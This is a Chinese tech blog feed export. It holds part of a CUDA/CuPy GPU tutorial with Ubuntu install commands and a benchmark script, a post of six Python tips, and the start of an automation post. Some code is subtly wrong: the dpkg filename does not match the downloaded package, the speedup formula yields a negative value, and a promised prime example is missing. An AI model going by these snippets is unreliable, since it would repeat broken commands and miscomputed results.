<p>线程被分组为块，当内核启动时，它们被映射到一组相应的 CUDA 内核。块进一步分组为网格，每次内核启动都会创建一个网格。</p>
<p>CUDA 编程模型允许软件工程师使用支持 CUDA 的 GPU 在 C&#x2F;C++ 和 Fortran 中进行通用处理，<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubnZpZGlhLmNvbS9sYW5ndWFnZS1zb2x1dGlvbnM=">第三方包装器<i class="fa fa-external-link-alt"></i></span>也可用于 Python、Java、R 和其他几种编程语言。CUDA 兼容从 G8x 系列开始的所有 Nvidia GPU，以及大多数标准操作系统。</p>
<h3 id="OpenCL"><a href="#OpenCL" class="headerlink" title="OpenCL"></a>OpenCL</h3><p>虽然 CUDA 是专有框架，但 OpenCL 是由 Khronos Group 创建的跨异构平台并行编程的开放标准。OpenCL 与中央处理器 (CPU)、图形处理单元 (GPU)、数字信号处理器、现场可编程门阵列 (FPGA) 和其他处理器或硬件加速器协同工作。</p>
<p>OpenCL 用途极为广泛，已被科技行业巨头成功采用，包括 AMD、Apple、IBM、Intel、Nvidia、Qualcomm、Samsung 等。它基于 C&#x2F;C++ 语言，<span class="exturl" data-url="aHR0cHM6Ly9zdHJlYW1ocGMuY29tL2tub3dsZWRnZS9mb3ItZGV2ZWxvcGVycy9vcGVuY2wtd3JhcHBlcnMv">第三方包装器<i class="fa fa-external-link-alt"></i></span>也可用于 Python、Java、R、GO、JavaScript 等。</p>
<h3 id="OpenACC"><a href="#OpenACC" class="headerlink" title="OpenACC"></a>OpenACC</h3><p>OpenACC 是一种用户驱动的基于指令的并行编程标准，专为有兴趣将其代码移植到各种异构高性能计算 (HPC) 硬件平台的科学家和工程师而设计。该标准是由用户为用户设计的。</p>
<p>OpenACC 旨在简化异构 CPU&#x2F;GPU 硬件平台和架构的并行编程，其编程工作量比低级模型所需的工作量少得多。它支持 C&#x2F;C++ 和 Fortran 编程语言。</p>
<h2 id="使用-CUDA-和-Python-进行-GPU-编程"><a href="#使用-CUDA-和-Python-进行-GPU-编程" class="headerlink" title="使用 CUDA 和 Python 进行 GPU 编程"></a>使用 CUDA 和 Python 进行 GPU 编程</h2><p>开始构建 GPU 加速程序有多种标准和多种编程语言，但我们选择了 CUDA 和 Python 来说明我们的示例。CUDA 是最容易上手的框架，Python 在科学、工程、数据分析和深度学习领域非常流行——所有这些都严重依赖并行计算。</p>
<p>即使在 Python 中，您也可以在不同的抽象层上进行 GPU 编程。如果您不需要较低抽象层可以提供的额外自定义和控制功能，那么从满足您的应用程序的最高抽象层开始是合理的。</p>
<p>让我们回顾一下在 Python 中使用 CUDA 的方法，从最高抽象级别开始一直到最低级别。</p>
<h3 id="CUDA-用于专业库"><a href="#CUDA-用于专业库" class="headerlink" title="CUDA 用于专业库"></a>CUDA 用于专业库</h3><p>如果您只想使用神经网络或任何其他深度学习算法，那么 Tensorflow 或 PyTorch 等专业深度学习库可能是您的正确选择。这些库可以在后台为您自动在 CPU 和 GPU 处理之间切换。</p>
<h3 id="CUDA-做为直接替代品"><a href="#CUDA-做为直接替代品" class="headerlink" title="CUDA 做为直接替代品"></a>CUDA 做为直接替代品</h3><p>如果您是使用 NumPy 和 SciPy 的科学家，优化 GPU 计算代码的最简单方法是使用 CuPy。它模仿大多数 NumPy 函数，并允许您简单地插入 NumPy 代码并将其替换为在 GPU 而不是 CPU 上处理的 CuPy 函数。<br>CUDA 用于自定义算法。</p>
<p>当您需要使用自定义算法时，您不可避免地需要深入抽象层次结构并使用 NUMBA。它绑定到 CUDA 并允许您在 Python 中编写自己的 CUDA 内核。通过这种方式，您可以仅使用 Python 非常接近 CUDA C&#x2F;C++，而无需自己分配内存。</p>
<h3 id="CUDA-做为-C-C-扩展"><a href="#CUDA-做为-C-C-扩展" class="headerlink" title="CUDA 做为 C&#x2F;C++ 扩展"></a>CUDA 做为 C&#x2F;C++ 扩展</h3><p>如果您想要对硬件进行最高级别的控制，例如手动内存分配、动态并行性或纹理内存管理，那么使用 C&#x2F;C++ 是没有办法的。对于 Python 应用程序，最方便的方法是使用 PyCUDA 扩展，它允许您在 Python 字符串中编写 CUDA C&#x2F;C++ 代码。</p>
<h2 id="如何在-Ubuntu-20-04-上开始使用-CUDA-for-Python？"><a href="#如何在-Ubuntu-20-04-上开始使用-CUDA-for-Python？" class="headerlink" title="如何在 Ubuntu 20.04 上开始使用 CUDA for Python？"></a>如何在 Ubuntu 20.04 上开始使用 CUDA for Python？</h2><h3 id="在-Ubuntu-20-04-上安装-CUDA"><a href="#在-Ubuntu-20-04-上安装-CUDA" class="headerlink" title="在 Ubuntu 20.04 上安装 CUDA"></a>在 Ubuntu 20.04 上安装 CUDA</h3><p>首先，您需要在具有支持 CUDA 的 GPU 的机器上<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubnZpZGlhLmNvbS9jdWRhLWRvd25sb2Fkcw==">安装 CUDA<i class="fa fa-external-link-alt"></i></span>。要使用本地安装程序在 Ubuntu 20.04 上安装 CUDA 驱动程序，请按照以下说明操作：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin</span><br><span class="line"><span class="attribute">sudo</span> mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-<span class="number">600</span></span><br><span class="line"><span class="attribute">wget</span> https://developer.download.nvidia.com/compute/cuda/<span class="number">11</span>.<span class="number">4</span>.<span class="number">2</span>/local_installers/cuda-repo-ubuntu2004-<span class="number">11</span>-<span class="number">4</span>-local_11.<span class="number">4</span>.<span class="number">2</span>-<span class="number">470</span>.<span class="number">57</span>.<span class="number">02</span>-<span class="number">1</span>_amd64.deb  </span><br><span class="line"><span class="attribute">sudo</span> dpkg -i cuda-repo-ubuntu2004-<span class="number">11</span>-<span class="number">4</span>-local_11.<span class="number">2</span>-<span class="number">470</span>.<span class="number">57</span>.<span class="number">02</span>-<span class="number">1</span>_amd64.deb  </span><br><span class="line"><span class="attribute">sudo</span> apt-key add /var/cuda-repo-ubuntu2004-<span class="number">11</span>-<span class="number">4</span>-local/<span class="number">7</span>fa2af80.pub </span><br><span class="line"><span class="attribute">sudo</span> apt-get update  </span><br><span class="line"><span class="attribute">sudo</span> apt-get -y install cuda</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="安装-CuPy-库"><a href="#安装-CuPy-库" class="headerlink" title="安装 CuPy 库"></a>安装 CuPy 库</h3><p>接下来，我们需要安装一个 Python 库来使用 CUDA。如上所述，有许多方法可以在不同的抽象级别在 Python 中使用 CUDA。由于 NumPy 是 Python 数据科学生态系统的骨干库，我们将选择对其进行加速以进行本次演示。</p>
<p>使用 NumPy 的最简单方法是使用名为 CuPy 的插入式替换库，它在 GPU 上复制 NumPy 函数。您可以通过 pip 安装稳定版的 CuPy 源码包：</p>
<p><code>pip install cupy</code></p>
<h3 id="编写脚本来比较-CPU-和-GPU"><a href="#编写脚本来比较-CPU-和-GPU" class="headerlink" title="编写脚本来比较 CPU 和 GPU"></a>编写脚本来比较 CPU 和 GPU</h3><p>最后，您要确保 CuPy 在您的系统上运行良好，以及它能在多大程度上提高您的性能。为此，让我们编写一个简单的脚本来实现这一目的。</p>
<p>让我们导入 NumPy 和 CuPy 库，以及我们将用于基准处理单元的时间库。</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cupy <span class="keyword">as</span> cp  </span><br><span class="line"><span class="title">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来，让我们定义一个将用于基准测试的函数。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">def benchmark_processor(arr, func, argument):  </span><br><span class="line">    start_time = <span class="built_in">time</span>()    </span><br><span class="line">    func(arr, argument) <span class="comment"># your argument will be broadcasted into a matrix automatically</span></span><br><span class="line">    finish_time = <span class="built_in">time</span>()</span><br><span class="line">    elapsed_time = finish_time – start_time    </span><br><span class="line"><span class="built_in">    return</span> elapsed_time</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后需要实例化两个矩阵：一个用于 CPU，一个用于 GPU。我们将为我们的矩阵选择 9999 x 9999 的形状。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># load a matrix to global memory</span></span><br><span class="line"><span class="attribute">array_cpu</span> = np.random.randint(<span class="number">0</span>, <span class="number">255</span>, size=(<span class="number">9999</span>, <span class="number">9999</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># load the same matrix to GPU memory</span></span><br><span class="line"><span class="attribute">array_gpu</span> = cp.asarray(array_cpu)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后，我们要运行一个简单的加法函数来确定 CPU 与 GPU 处理器的性能差异。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># benchmark matrix addition on CPU by using a NumPy addition function</span></span><br><span class="line"><span class="attribute">cpu_time</span> = benchmark_processor(array_cpu, np.add, <span class="number">999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># you need to run a pilot iteration on a GPU first to compile and cache the function kernel on a GPU</span></span><br><span class="line"><span class="attribute">benchmark_processor</span>(array_gpu, cp.add, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># benchmark matrix addition on GPU by using CuPy addition function</span></span><br><span class="line"><span class="attribute">gpu_time</span> = benchmark_processor(array_gpu, cp.add, <span class="number">999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># determine how much is GPU faster</span></span><br><span class="line"><span class="attribute">faster_processor</span> = (gpu_time - cpu_time) / gpu_time * <span class="number">100</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>并将结果打印到控制台。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;CPU time: <span class="subst">&#123;cpu_time&#125;</span> seconds\nGPU time: <span class="subst">&#123;gpu_time&#125;</span> seconds.\nGPU was <span class="subst">&#123;faster_processor&#125;</span> percent faster&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hlcnJ5c2VydmVycy5jb20vZGVkaWNhdGVkLWdwdS1zZXJ2ZXJz">在配备来自Cherry Servers GPU Cloud<i class="fa fa-external-link-alt"></i></span>的 Nvidia Geforce GT1030 GPU 加速器的 Intel Xeon 1240v3 机器上运行此脚本后，我们确认整数加法在 GPU 上的运行速度快了许多倍。例如，当使用 10000x10000 矩阵时，GPU 运行整数加法的速度要快 1294 倍。</p>
<p>事实上，矩阵越大，您期望的性能提升就越高。</p>
<p>cuda-gpu-基准测试</p>
<p><strong>图 1</strong> – <em>GPU 性能提升。</em></p>
<p>我们通过对 100x100、500x500、1000x1000、7500x7500 和 10000x10000 二维矩阵使用整数加法，比较了 CPU 与 GPU 的性能（以秒为单位）。当使用足够大的矩阵时，GPU 开始明显超过 CPU。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubnZpZGlhLmNvbS8=">Nvidia 开发者官网<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWxpeXVuLmNvbS9taW5pc2l0ZS9nb29kcz91c2VyQ29kZT02OWhpdmlpbg==">Aliyun Servers GPU 服务器<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hlcnJ5c2VydmVycy5jb20vP2FmZmlsaWF0ZT0xVE82N0lWTQ==">Cherry Servers GPU 服务器<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>如果您正在处理可以并行处理的大量数据，那么深入研究 GPU 编程可能是值得的。如您所见，使用 GPU 计算处理大型矩阵时性能显着提高。到一天结束时，如果您的应用程序可以利用并行计算，它可能会为您节省宝贵的时间和资源。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>CUDA</tag>
      </tags>
  </entry>
  <entry>
    <title>每个 Python 开发人员都应该具备的 6 个实用技巧</title>
    <url>/2022/11/python-practice/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Python 已成为一种流行的编程语言，因为它清晰、通用、易于学习，并且它具有大量用于不同任务的有用库。从 Web 开发到数据科学和网络安全，Python 程序员的需求量很大。</p>
<p>但就像所有编程语言一样，在 Python 中，一切都取决于你，程序员。你决定你的代码看起来是专业的还是丑陋的。</p>
<span id="more"></span>

<p>幸运的是，Python 具有大量内置功能，可以帮助您编写优雅、简洁和可扩展的代码，这些都是您期望专业程序员具备的特性。</p>
<p>这里有一些我最喜欢的技巧，我认为每个 Python 开发人员都应该知道。</p>
<h2 id="1-列表推导"><a href="#1-列表推导" class="headerlink" title="1. 列表推导"></a>1. 列表推导</h2><p>列表推导式是 Python 的关键特性之一，可帮助您编写更简洁和优雅的代码。假设您要创建一个包含从 1 到 100 的数字的数组。方便的方法是使用 <strong>range()</strong> 函数：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">numbers</span> = list(range(<span class="number">1</span>, <span class="number">101</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是如果你想做一些更复杂的事情，比如创建一个从 1 到 100 的正方形列表呢？在这种情况下，经典的方法是使用 <strong>for</strong> 循环：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">numbers</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="attribute">numbers</span>.append(i**<span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是大多数编程语言支持的标准方式。但幸运的是，在 Python 中，列表推导使事情变得容易得多。以下是在列表理解模式下编写相同代码时的样子：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">numbers</span> = [i**<span class="number">2</span> for i in range(<span class="number">1</span>, <span class="number">101</span>)]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>您可以使用列表推导在定义列表的括号中打包多个指令和表达式。它们比 <strong>for</strong> 循环更短更优雅。在保持代码整洁的同时，您还可以做更多事情。例如，假设您有一个函数 <strong>is_prime()</strong> 来检查输入数字，如果它是质数则返回 True。以下代码片段通过向推导添加 <strong>is_prime()</strong> 条件来创建从 1 到 100 的素数平方列表。</p>
<h2 id="2-链式结构"><a href="#2-链式结构" class="headerlink" title="2. 链式结构"></a>2. 链式结构</h2><p>另一个偶尔派上用场的 Python 功能是 <strong>zip()</strong> 函数。<strong>zip</strong> 将两个或多个列表组合成一个变量。假设您收集了一份客户姓名、他们的年龄和他们最喜欢的冰淇淋口味的列表。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">customers</span> = [<span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;Natasha&#x27;</span>, <span class="string">&#x27;Eric&#x27;</span>, <span class="string">&#x27;Sally&#x27;</span>]</span><br><span class="line"><span class="attr">ages</span> = [<span class="number">26</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">22</span>]</span><br><span class="line"><span class="attr">flavors</span> = [<span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;chocolate&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;lemon&#x27;</span>] </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 **zip()**，您可以将所有三个列表合并到一个列表中，其中每个条目都包含一个元组，其中包含一个客户的姓名、年龄和偏好。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">combined</span> = zip(customers, ages, flavors)</span><br><span class="line"><span class="attr">customers_ice_cream</span> = list(combined)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是您的customers_ice_cream 列表在压缩数据后的样子：</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">[(<span class="symbol">&#x27;John</span>&#x27;, <span class="number">26</span>, <span class="symbol">&#x27;cherry</span>&#x27;),</span><br><span class="line"> (<span class="symbol">&#x27;Natasha</span>&#x27;, <span class="number">31</span>, <span class="symbol">&#x27;chocolate</span>&#x27;),</span><br><span class="line"> (<span class="symbol">&#x27;Eric</span>&#x27;, <span class="number">39</span>, <span class="symbol">&#x27;strawberry</span>&#x27;),</span><br><span class="line"> (<span class="symbol">&#x27;Sally</span>&#x27;, <span class="number">22</span>, <span class="symbol">&#x27;lemon</span>&#x27;)]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以下是如何在循环中使用压缩列表：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> cust <span class="keyword">in</span> customers_ice_cream:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is &#123;&#125; years old and likes &#123;&#125;&quot;</span>.format(<span class="number">*c</span>ust))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出如下所示：</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">John <span class="keyword">is</span> <span class="number">26</span> years <span class="keyword">old</span> <span class="keyword">and</span> likes cherry</span><br><span class="line">Natasha <span class="keyword">is</span> <span class="number">31</span> years <span class="keyword">old</span> <span class="keyword">and</span> likes chocolate</span><br><span class="line">Eric <span class="keyword">is</span> <span class="number">39</span> years <span class="keyword">old</span> <span class="keyword">and</span> likes strawberry</span><br><span class="line">Sally <span class="keyword">is</span> <span class="number">22</span> years <span class="keyword">old</span> <span class="keyword">and</span> likes lemon</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-统计计数"><a href="#3-统计计数" class="headerlink" title="3. 统计计数"></a>3. 统计计数</h2><p>通常，您想知道某个值在列表中出现了多少次。例如，假设我们从在线调查中收集了 1-10 个评级的列表。为了模拟这一点，我们将使用 <strong>randint()</strong> 函数生成从 1 到 10 的 1,000 个随机数的列表。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">from random <span class="keyword">import</span> <span class="type">randint</span></span><br><span class="line"><span class="variable">ratings</span> <span class="operator">=</span> [randint(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">for</span> _ in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">1001</span>)</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在，我们想知道每个评分中有多少包含在列表中。一种方法是使用列表的内置 <strong>计数</strong> 功能。<strong>count()</strong> 接受一个值并返回该值在列表中出现的次数。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125; occurences&quot;</span><span class="selector-class">.format</span>(<span class="selector-tag">i</span>, ratings<span class="selector-class">.count</span>(i)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此代码产生以下输出：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>: <span class="number">95</span> occurrences</span><br><span class="line"><span class="attribute">2</span>: <span class="number">115</span> occurrences</span><br><span class="line"><span class="attribute">3</span>: <span class="number">111</span> occurrences</span><br><span class="line"><span class="attribute">4</span>: <span class="number">109</span> occurrences</span><br><span class="line"><span class="attribute">5</span>: <span class="number">81</span> occurrences</span><br><span class="line"><span class="attribute">6</span>: <span class="number">110</span> occurrences</span><br><span class="line"><span class="attribute">7</span>: <span class="number">80</span> occurrences</span><br><span class="line"><span class="attribute">8</span>: <span class="number">94</span> occurrences</span><br><span class="line"><span class="attribute">9</span>: <span class="number">98</span> occurrences</span><br><span class="line"><span class="attribute">10</span>: <span class="number">107</span> occurrences</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是，这仅在您事先知道列表中值的范围时才有效。如果您不知道可能的值，您可以使用 <strong>set</strong>，它会创建一个包含在另一个列表中的唯一项目的列表。例如，如果您有一个名称列表并且想知道每个名称出现了多少次，您可以使用以下代码。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="type">name</span> <span class="keyword">in</span> <span class="keyword">set</span>(names):</span><br><span class="line">    print(&quot;&#123;&#125;: &#123;&#125; occurences&quot;.format(<span class="type">name</span>, names.count(<span class="type">name</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>或者，您可以使用_Counter_类，该类专门计算列表中的值。</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections import Counter</span><br><span class="line">ratings_count = Counter(ratings)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">rating</span> <span class="built_in">in</span> ratings_count:</span><br><span class="line">    print(<span class="string">&quot;&#123;&#125;: &#123;&#125; occurences&quot;</span>.<span class="built_in">format</span>(<span class="built_in">rating</span>, ratings_count[<span class="built_in">rating</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Counter 提供了一些附加功能，例如 <strong>most_common()</strong> 函数，它为您提供列表中出现次数最多的值。例如，以下代码将打印出三个最受欢迎的值：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">for rating <span class="keyword">in</span> ratings_count.most_commo<span class="meta">n</span>(3):</span><br><span class="line">    pr<span class="meta">int</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125; occurences&quot;</span>.<span class="keyword">format</span>(<span class="comment">*rating))</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<h2 id="4-枚举"><a href="#4-枚举" class="headerlink" title="4. 枚举"></a>4. 枚举</h2><p>有时，您希望在遍历列表时跟踪项目数。假设您有一个客户名称列表，并且您希望将它们与索引号一起列出。这是一种方法：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(customers)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span><span class="selector-class">.format</span>(i+<span class="number">1</span>, customers<span class="selector-attr">[i]</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这将产生如下所示的输出：</p>
<figure class="highlight ldif"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>: Samantha</span><br><span class="line"><span class="attribute">2</span>: Mara</span><br><span class="line"><span class="attribute">3</span>: Eric</span><br><span class="line"><span class="attribute">4</span>: James</span><br><span class="line"><span class="attribute">5</span>: George</span><br><span class="line"><span class="attribute">6</span>: Toni</span><br><span class="line"><span class="attribute">7</span>: Margaret</span><br><span class="line"><span class="attribute">8</span>: Steven</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然这段代码有效，但它不是很优雅。注意到索引和计数器之间的不匹配了吗？幸运的是，Python 有一个 <strong>enumerate()</strong> 函数，可以让你的索引跟踪代码更容易理解和赏心悦目。<strong>enumerate()</strong> 接受两个参数，即要枚举的列表和计数器的起始编号，并在循环的每一轮中给出两个输出，即计数器值和列表项。这是 <strong>enumerate</strong> 解决了同样的问题。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span>, customer <span class="keyword">in</span> <span class="built_in">enumerate</span>(customers, <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span><span class="selector-class">.format</span>(<span class="selector-tag">i</span>, customer))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>好多了。</p>
<h2 id="5-参数扩展"><a href="#5-参数扩展" class="headerlink" title="5. 参数扩展"></a>5. 参数扩展</h2><p>假设您有一个处理学生信息的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_student_info</span>(<span class="params">first_name, last_name, fav_topic, score</span>):</span><br><span class="line">    <span class="built_in">print</span>(first_name, last_name, fav_topic, score)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在许多情况下，您要传递给函数的值包含在从数据库或文本文件中填充的 <strong>列表</strong> 或 <strong>字典</strong> 对象中。在这种情况下，调用函数会有点笨拙：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">process_student_info</span>(student[<span class="number">0</span>], student[<span class="number">1</span>], student[<span class="number">2</span>], student[<span class="number">3</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>幸运的是，Python 的 “参数扩展” 功能使您能够直接将整个列表传递给函数。通过在列表名称的开头添加 *，您可以在将其提交给函数之前将其扩展为单独的值。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">process_student_info</span><span class="params">(*student)</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只要参数的数量和它们的顺序与目标函数的参数相似，使用列表的参数扩展就可以工作。如果不匹配，它将引发错误。</p>
<p>您还可以对字典使用参数扩展，在这种情况下，值的顺序无关紧要。您只需要拥有与您的功能参数相对应的键。字典的参数扩展需要对象前的 ** 运算符。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">student = &#123;<span class="string">&#x27;last_name&#x27;</span>: <span class="string">&#x27;doe&#x27;</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">89</span>, <span class="string">&#x27;first_name&#x27;</span>: <span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;fav_topic&#x27;</span>: <span class="string">&#x27;calculus&#x27;</span>&#125;</span><br><span class="line"><span class="function"><span class="title">process_student_info</span><span class="params">(**student)</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用字典扩展的好处之一是，如果您的函数具有默认参数，则在字典中省略它们不会引发错误。</p>
<h2 id="6-类型注释"><a href="#6-类型注释" class="headerlink" title="6. 类型注释"></a>6. 类型注释</h2><p>Python 是一种 <strong>动态类型的</strong> 语言，这意味着如果您尝试混合具有不同数据类型的变量，它通常会找到解决差异的方法，如果不能，则会引发异常。但这种灵活性也可能导致不可预测的行为。</p>
<p>假设您有一个将两个变量相乘的函数。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a * b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果您在两个整数或浮点数上调用 <strong>mul()</strong> - 您对该函数的预期用途 - 结果是可预测的。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = <span class="number">5</span></span><br><span class="line"><span class="selector-tag">b</span> = <span class="number">6</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mul(a, b)</span></span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">30</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是，如果您的变量之一是列表怎么办？</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> = <span class="selector-attr">[1, 2, 4, 5]</span></span><br><span class="line"><span class="selector-tag">b</span> = <span class="number">3</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mul(a, b)</span></span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">[<span class="number">1、2、4、5</span>、<span class="number">1、2、4、5</span>、<span class="number">1、2、4、5</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该函数创建一个列表，该列表是列表的三个连接副本。这显然不是你想要做的。Python 3.6 及更高版本提供 “类型注释”，该功能使您能够定义每个函数参数应采用的数据类型。这是类型注释的 <strong>mul()</strong> 函数的样子。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">def <span class="title function_ invoke__">mul</span>(<span class="attr">a</span>: <span class="keyword">int</span>, <span class="attr">b</span>: <span class="keyword">int</span>): </span><br><span class="line">    <span class="keyword">return</span> a * b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种格式明确指出 <strong>mul()</strong> 采用两个整数值。需要明确的是，类型注释不会阻止您以非预期的方式使用该函数。但是无论如何都有一些很好的理由使用它。</p>
<p>首先，定义数据类型是一种文档形式，它使其他开发人员更容易通过您的代码了解您希望函数中的数据类型（比较函数的注释和非注释版本）。</p>
<p>但更重要的是，一些代码编辑器会处理类型注释并帮助您使用自动完成和类型错误等功能。</p>
<p>auto complete</p>
<h2 id="结束的想法"><a href="#结束的想法" class="headerlink" title="结束的想法"></a>结束的想法</h2><p>这是我最喜欢的六个 Python 技巧。使用它们将使您的代码简洁优雅。随着 Python 迅速成为许多领域和机构中事实上的编程语言，拥有一套良好的最佳实践将确保您能够成为开发团队中高效的成员。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>5 个自动化生活的 Python 项目：从初学者到高级</title>
    <url>/2022/11/python-rpa/</url>
    <content><![CDATA[<h2 id="2022年你应该解决的全新自动化项目"><a href="#2022年你应该解决的全新自动化项目" class="headerlink" title="2022年你应该解决的全新自动化项目"></a>2022年你应该解决的全新自动化项目</h2><p>如果你正在学习 Python，你应该尝试自动化你的日常任务。</p>
